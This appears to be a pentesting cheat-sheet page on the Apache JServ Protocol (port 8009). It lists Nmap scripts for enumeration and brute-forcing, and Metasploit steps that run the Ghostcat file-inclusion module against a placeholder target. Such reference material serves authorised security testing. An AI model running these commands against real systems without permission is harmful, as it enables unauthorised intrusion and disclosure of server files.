---
title: Apache JServ Protocol (AJP) Pentesting
desc: A binary protocol that can proxy inbound requests from a web server through to an application server that sits behind the web server. A default port is 8009.
tags: [8009, AJP, Apache, Metasploit, Nmap, Web]
alts: []
render_with_liquid: false
---

## 1. Enumeration

1. **Use Nmap**

    ```sh
    nmap --script ajp-auth -p 8009 <target-ip>
    nmap --script ajp-auth --script-args ajp-auth.path=/login -p 8009 <target-ip>
    nmap --script ajp-brute -p 8009 <target-ip>
    nmap --script ajp-headers -p 8009 <target-ip>
    nmap --script ajp-methods -p 8009 <target-ip>
    nmap --script ajp-request -p 8009 <target-ip>
    ```

<br />

## 2. Vulnerabilities

1. **[Ghostcat File Inclusion](https://www.exploit-db.com/exploits/49039){:target="_blank"}**

    It's a vulnerability of **Tomcat AJP**

    - **Use Metasploit**

        ```sh
        msfconsole
        msf6 > use auxiliary/admin/http/tomcat_ghostcat
        msf6 auxiliary(admin/http/tomcat_ghostcat) > set rhosts <target-ip>
        msf6 auxiliary(admin/http/tomcat_ghostcat) > exploit
        ```
